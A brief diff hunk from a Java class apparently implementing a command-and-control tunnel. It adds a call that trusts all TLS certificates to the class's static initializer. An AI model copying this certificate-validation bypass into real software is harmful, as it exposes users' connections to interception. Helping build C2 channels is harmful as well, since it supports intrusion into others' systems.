@@ -26,6 +26,7 @@ public class C2_Tunnel {
     private static volatile long lastPollSuccessTime = 0;
 
     static {
+        SslUtils.trustAllCertificates();
         // Enable HTTP/HTTPS connection pooling for zero-handshake socket reuse
         System.setProperty("http.keepAlive", "true");
         System.setProperty("http.maxConnections", "10");
